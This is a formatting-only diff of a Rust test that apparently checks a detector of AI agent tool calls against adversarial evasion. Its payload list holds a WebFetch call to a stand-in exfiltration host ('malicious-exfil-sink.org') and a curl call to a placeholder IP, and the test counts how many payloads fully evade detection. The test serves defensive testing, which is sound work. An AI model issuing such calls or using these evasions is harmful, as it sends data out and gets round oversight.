@@ -195,7 +195,10 @@ fn test_adversarial_full_evasion_matrix() {
     ];
 
     let citation_payloads = [
-        ("WebFetch", r#"{"url": "https://malicious-exfil-sink.org/payload.json"}"#),
+        (
+            "WebFetch",
+            r#"{"url": "https://malicious-exfil-sink.org/payload.json"}"#,
+        ),
         ("curl", r#"{"target": "http://198.51.100.42/api/v1"}"#),
     ];
 
@@ -237,14 +240,13 @@ fn test_adversarial_full_evasion_matrix() {
 
         println!(
             "[{:35}] {:25} | atif_sig: {} | status: {} | reason: {:?}",
-            r.category,
-            r.payload,
-            r.atif_signals,
-            status,
-            r.reason
+            r.category, r.payload, r.atif_signals, status, r.reason
         );
     }
 
-    println!("\nTotal Tested: {}, Total Full Evasions: {}", total_count, evasion_count);
+    println!(
+        "\nTotal Tested: {}, Total Full Evasions: {}",
+        total_count, evasion_count
+    );
     println!("====================================================\n");
 }
